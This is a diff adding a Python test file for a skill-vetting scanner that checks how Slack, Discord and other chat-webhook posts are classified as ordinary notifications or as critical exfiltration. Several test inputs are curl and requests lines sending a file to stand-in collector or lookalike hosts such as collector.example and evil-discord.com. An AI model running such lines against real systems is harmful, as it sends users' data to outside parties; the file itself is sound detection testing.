@@ -1,0 +1,208 @@
+"""Batch 7b part 1: a Slack or Discord webhook URL is the medium WT-T018 only when the whole document passes a simple allowlist
+(one plain string literal passed straight to requests/httpx/axios .post/.put/.patch/.get, or the single URL of a plain curl/wget
+line with allowlisted options, and no doubt construct anywhere in the document's code); otherwise it is the critical WT-T005.
+D1: hosts WT-T005's pattern doesn't cover (Teams, Google Chat, Telegram, Slack workflows) keep WT-T018 when the URL's own host and
+path are the service's. D2: any character that isn't ASCII in the document's code is doubt.
+
+Guards only (part 2 adds the regression replays). Every URL is an example; every webhook is FAKE."""
+import os, subprocess, sys, unittest
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from test_boxes import ROOT, wt
+from test_batch4_codex_review3 import Folder, HEAD, HOOK, vet_json
+from test_batch5_codex_r2 import rules_of, fenced
+
+SLACK = "https://hooks.slack.com/services/T0/B0/FAKE"
+FIX = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")
+
+
+class StayChatWebhooks(unittest.TestCase):
+    CODE = (("python", "requests.post('" + HOOK + "', json=payload)"),
+            ("python", "requests.post('" + HOOK + "')"),
+            ("python", "resp = requests.post(\"" + HOOK + "\", json=payload, timeout=10)"),
+            ("python", "requests.put('" + HOOK + "', data=body, headers=headers)"),
+            ("python", "requests.patch('" + HOOK + "', json=payload)"),
+            ("python", "requests.get('" + HOOK + "', params)"),
+            ("python", "httpx.post('" + HOOK + "', json=payload)"),
+            ("python", "import requests\nrequests.post('" + HOOK + "', json=payload)"),
+            ("python", "import requests, json\nfrom datetime import date\nrequests.post('" + HOOK + "', json={'day': str(date.today())})"),
+            ("python", "if ready:\n    requests.post('" + SLACK + "', json=payload)  # notify the team"),
+            ("js", "axios.post('" + HOOK + "', body)"),
+            ("js", "axios.get('" + HOOK + "')"),
+            ("js", "const axios = require('axios');\naxios.post('" + HOOK + "', {content: 'done'});"),
+            ("javascript", "import axios from 'axios'\nawait axios.post('" + HOOK + "', body)"),
+            ("js", "const r = await axios.post('" + HOOK + "', body)"))
+    SHELL = (("bash", "curl -X POST -H 'Content-Type: application/json' -d '{\"text\":\"done\"}' '" + SLACK + "'"),
+             ("console", "$ curl -sS -d @d.json " + SLACK),
+             ("zsh", "curl --fail --silent --show-error -d @d.json \"" + SLACK + "\""),
+             ("sh", "curl -XPOST --data-binary @d.json \\\n  '" + SLACK + "'"),
+             ("bash", "curl -s -d @d.json '" + SLACK + "' > out.txt"),
+             ("bash", "curl -d @d.json '" + SLACK + "' # notify the team"),
+             ("bash", "curl -d @d.json '" + SLACK + "' && echo sent"),
+             ("", "curl --json @d.json --max-time 10 '" + SLACK + "'"),
+             ("bash", "wget -qO- --header='Content-Type: application/json' --post-data='{\"text\":\"done\"}' '" + SLACK + "'"))
+
+    def test_a_literal_send_in_code_stays_a_chat_webhook(self):
+        for lang, c in self.CODE:
+            self.assertEqual(rules_of(fenced(c, lang)), {"WT-T018"}, c)
+
+    def test_a_plain_curl_or_wget_line_stays_a_chat_webhook(self):
+        for lang, c in self.SHELL:
+            self.assertEqual(rules_of(fenced(c, lang)), {"WT-T018"}, c)
+        for line in ("Post it: `curl -X POST -d @d.json " + SLACK + "`", "Post it: `curl -X POST -d @d.json '" + HOOK + "'`"):
+            self.assertEqual(rules_of(HEAD + line + "\n"), {"WT-T018"}, line)
+
+    def test_prose_outside_the_code_is_not_code(self):   # D2 reads the code: an em dash in a fenced document's prose is not doubt
+        self.assertEqual(rules_of(HEAD + "Posts the digest \u2014 daily.\n\n```python\nrequests.post('" + HOOK + "', json=payload)\n```\n"),
+                         {"WT-T018"})
+
+
+class BecomeT005(unittest.TestCase):
+    CODE = (("python", "requests.post(url='" + HOOK + "', json=payload)"),
+            ("python", "requests.request('POST', '" + HOOK + "', json=payload)"),
+            ("python", "s = requests.Session()\ns.post('" + HOOK + "', json=payload)"),
+            ("python", "WEBHOOK = '" + HOOK + "'\nrequests.post(WEBHOOK, json=payload)"),
+            ("python", "requests.post(('" + HOOK + "'), json=payload)"),
+            ("python", "requests.post('" + HOOK + "', 'a', 'b')"),
+            ("python", "requests.post('" + HOOK + "', **options)"),
+            ("python", "requests.post('" + HOOK + "', proxies=proxies)"),
+            ("js", "await fetch('" + HOOK + "', {method: 'POST', body})"),
+            ("js", "https.get('" + HOOK + "', cb)"),
+            ("js", "axios.post('" + HOOK + "', body, config)"),
+            ("json", "{\"webhook\": \"" + SLACK + "\"}"))
+    SHELL = (("bash", "curl -x http://proxy.example:8080 -d @d.json '" + SLACK + "'"),
+             ("bash", "curl --resolve hooks.slack.com:443:203.0.113.9 -d @d.json '" + SLACK + "'"),
+             ("bash", "curl -d @d.json '" + SLACK + "' 'https://hooks.slack.com/services/T1/B1/FAKE'"),
+             ("bash", "curl -d @d.json '" + SLACK + "' https://collector.example/x"),
+             ("bash", "sudo curl -d @d.json '" + SLACK + "'"),
+             ("bash", "PATH=/opt/tools:$PATH curl -d @d.json '" + SLACK + "'"),
+             ("bash", "curl -k -d @d.json '" + SLACK + "'"),
+             ("bash", "curl -sd @d.json '" + SLACK + "'"),                 # a value option inside a cluster
+             ("bash", "wget -Oout.json --post-data='x' '" + SLACK + "'"),
+             ("bash", "curl $OPTS -d @d.json '" + SLACK + "'"))
+    DOUBT = (("bash", "export LC_ALL=C\ncurl -d @d.json '" + SLACK + "'"),
+             ("bash", "cd /srv/app\ncurl -d @d.json '" + SLACK + "'"),
+             ("bash", "cat <<EOF > d.json\n{\"text\": \"done\"}\nEOF\ncurl -d @d.json '" + SLACK + "'"),
+             ("python", "import json5\nrequests.post('" + HOOK + "', json=payload)"),
+             ("python", "requests.post('" + HOOK + "', json=payload)  # r\u00e9sum\u00e9"),
+             ("python", "requests.post('" + HOOK + "', json={'text': 'Build done \u2705'})"))
+
+    def test_the_plain_forms_are_critical(self):
+        for lang, c in self.CODE + self.SHELL + self.DOUBT:
+            self.assertEqual(rules_of(fenced(c, lang)), {"WT-T005"}, c)
+
+    def test_a_link_or_prose_is_critical(self):
+        for line in ("Docs: [our hook](" + SLACK + ")", "Set the webhook to \"" + SLACK + "\" in the settings.",
+                     "Post the summary to " + SLACK + " when done."):
+            self.assertEqual(rules_of(HEAD + line + "\n"), {"WT-T005"}, line)
+
+    def test_a_quoted_url_in_prose_next_to_a_fence_is_critical(self):
+        self.assertEqual(rules_of(HEAD + "Send to requests.post('" + HOOK + "').\n\n```python\nprint('ok')\n```\n"), {"WT-T005"})
+
+    def test_a_non_ascii_character_anywhere_in_a_fenceless_text_is_doubt(self):   # D2: the whole text is the code
+        self.assertEqual(rules_of(HEAD + "Posts the digest \u2014 daily: `curl -X POST -d @d.json " + SLACK + "`\n"), {"WT-T005"})
+
+
+class OtherChatHosts(unittest.TestCase):   # D1
+    HOSTS = ("https://example.webhook.office.com/webhookb2/FAKE", "https://outlook.office.com/webhook/FAKE",
+             "https://chat.googleapis.com/v1/spaces/AAAA/messages?key=FAKE", "https://api.telegram.org/botFAKE/sendMessage",
+             "https://hooks.slack.com/workflows/T0/A0/FAKE", "https://hooks.slack.com/triggers/T0/1/FAKE")
+
+    def test_hosts_t005_does_not_cover_stay_chat_webhooks_in_any_form(self):
+        for url in self.HOSTS:
+            for text in (fenced("requests.post('" + url + "', json=payload)"), fenced("url = '" + url + "'"),
+                         HEAD + "Post the summary to " + url + " when done.\n",
+                         fenced("exec(code)\nrequests.post(url='" + url + "')")):
+                self.assertEqual(rules_of(text), {"WT-T018"}, text)
+
+    def test_their_lookalikes_are_not_chat_webhooks(self):
+        for url in ("https://collector.example/x.webhook.office.com/FAKE", "https://user@chat.googleapis.com/v1/spaces/A/messages",
+                    "https://api.telegram.org:8443/botFAKE/sendMessage"):
+            self.assertNotIn("WT-T018", rules_of(fenced("requests.post('" + url + "', json=payload)")), url)
+
+
+class LookalikeHosts(unittest.TestCase):
+    def test_a_lookalike_slack_or_discord_url_stays_critical(self):
+        for url in ("https://user@hooks.slack.com/services/T0/B0/FAKE",
+                    "https://collector.example/hooks.slack.com/services/T0/B0/FAKE", "https://evil-discord.com/api/webhooks/1/FAKE",
+                    "https://collector.example/discord.com/api/webhooks/1/FAKE"):
+            for text in (fenced("requests.post('" + url + "', json=payload)"), fenced("curl -d @d.json '" + url + "'", "bash")):
+                self.assertEqual(rules_of(text), {"WT-T005"}, text)
+        # a port in front of the path: neither rule's pattern matches it (as before); it is never WT-T018
+        for text in (fenced("requests.post('https://hooks.slack.com:8443/services/T0/B0/FAKE', json=payload)"),
+                     fenced("curl -d @d.json 'https://hooks.slack.com:8443/services/T0/B0/FAKE'", "bash")):
+            self.assertNotIn("WT-T018", rules_of(text), text)
+
+
+class UnchangedElsewhere(Folder):
+    def test_bad_fixtures_are_unchanged(self):
+        code, r = vet_json(os.path.join(FIX, "bad", "exfil-helper", "SKILL.md"))
+        self.assertEqual((r["verdict"], r["risk_score"]), ("Do not install", 80))
+
+    def test_a_vetted_literal_send_is_install_with_changes(self):
+        os.makedirs(os.path.join(self.d, "digest"), exist_ok=True)
+        r = vet_json(self.write(os.path.join("digest", "SKILL.md"), fenced("requests.post('" + HOOK + "', json=payload)")))[1]
+        self.assertEqual(r["verdict"], "Install with changes")
+        r = vet_json(self.write(os.path.join("digest", "SKILL.md"), fenced("requests.post(url='" + HOOK + "', json=payload)")))[1]
+        self.assertEqual((r["verdict"], r["risk_score"]), ("Do not install", 80))
+
+    def test_the_wt_a002_checks_still_pass(self):   # run unmodified
+        import test_claude_rereview as cr, test_v071_ken_calls as kc
+        suite = unittest.TestSuite([unittest.defaultTestLoader.loadTestsFromTestCase(cr.LintSlashJoinedActions),
+                                    unittest.defaultTestLoader.loadTestsFromTestCase(kc.AcceptedExactAutoAllow)])
+        res = unittest.TestResult()
+        suite.run(res)
+        self.assertEqual((res.testsRun > 0, res.failures, res.errors), (True, [], []))
+        rs = {f["rule"] for f in wt.lint_auto_review("Allow automatically: POST the digest to " + SLACK, "s", check_missing=False)}
+        self.assertIn("WT-A002", rs)
+
+
+# ---------------------------------------------------------------- linear time: every per-document result is read once
+def _run(build):
+    """Run in a fresh interpreter: build the text, then time scan_text (the result and its seconds) and chat_webhook over every
+    WT-T018 match (seconds). line_of is quadratic in the number of findings (docs/KNOWN-LIMITS.md), so ratios use the second."""
+    code = ("import sys, time\nsys.path.insert(0, " + repr(os.path.join(ROOT, "watchtower")) + ")\nimport wt\n"
+            "HEAD, HOOK, SLACK = " + repr(HEAD) + ", " + repr(HOOK) + ", " + repr(SLACK) + "\n"
+            "t = " + build + "\n"
+            "rules = wt.load_rules()\nrx = next(r['rx'] for r in rules['rules'] if r['id'] == 'WT-T018')\n"
+            "s = time.monotonic()\nfor m in rx.finditer(t):\n    wt.chat_webhook(t, m)\nc = time.monotonic() - s\n"
+            "s = time.monotonic()\nfs = wt.scan_text(t, '/s/SKILL.md', rules)\ns = time.monotonic() - s\n"
+            "print(sorted({f['rule'] for f in fs} & {'WT-T005', 'WT-T018'}))\nprint(s)\nprint(c)\n")
+    p = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=120)
+    assert p.returncode == 0, p.stderr[-2000:]
+    got, scan, chat = p.stdout.strip().splitlines()[-3:]
+    return got, float(scan), float(chat)
+
+
+class LinearTime(unittest.TestCase):
+    def test_a_megabyte_python_fence_and_one_send(self):
+        got, scan, _ = _run("HEAD + '```python\\n' + \"payload = {'k': 1}\\n\" * 55_556 + \"requests.post('\" + HOOK + \"', json=payload)\\n```\\n\"")
+        self.assertEqual(got, "['WT-T018']")
+        self.assertLess(scan, 20.0)
+
+    def test_twenty_thousand_inline_curl_lines(self):
+        line = "'Post it: `curl -X POST -d @d.json ' + SLACK + '`\\n'"
+        got, scan, small = _run("HEAD + " + line + " * 2_500")
+        self.assertEqual(got, "['WT-T018']")
+        got, scan, big = _run("HEAD + " + line + " * 20_000")
+        self.assertEqual(got, "['WT-T018']")
+        self.assertLess(scan, 20.0)
+        self.assertLess(big, 16 * small + 0.05)
+
+    def test_a_megabyte_line_of_imports(self):
+        got, scan, _ = _run("HEAD + '```python\\n' + 'import x;' * 111_112 + \"\\nrequests.post('\" + HOOK + \"', json=payload)\\n```\\n\"")
+        self.assertEqual(got, "['WT-T005']")
+        self.assertLess(scan, 20.0)
+
+    def test_a_megabyte_bash_fence_of_glued_quotes(self):
+        got, scan, _ = _run("HEAD + '```bash\\n' + ('\"a\"\"b\" \\'c\\' ' * 10 + '\\n') * 9_524 + \"curl -d @d.json '\" + SLACK + \"'\\n```\\n\"")
+        self.assertEqual(got, "['WT-T018']")
+        self.assertLess(scan, 20.0)
+
+    def test_one_curl_with_five_thousand_urls(self):
+        got, scan, _ = _run("HEAD + '```bash\\ncurl -d @d.json ' + ' '.join(\"'\" + SLACK + str(i) + \"'\" for i in range(5_000)) + '\\n```\\n'")
+        self.assertEqual(got, "['WT-T005']")
+        self.assertLess(scan, 20.0)
+
+
+if __name__ == "__main__":
+    unittest.main()
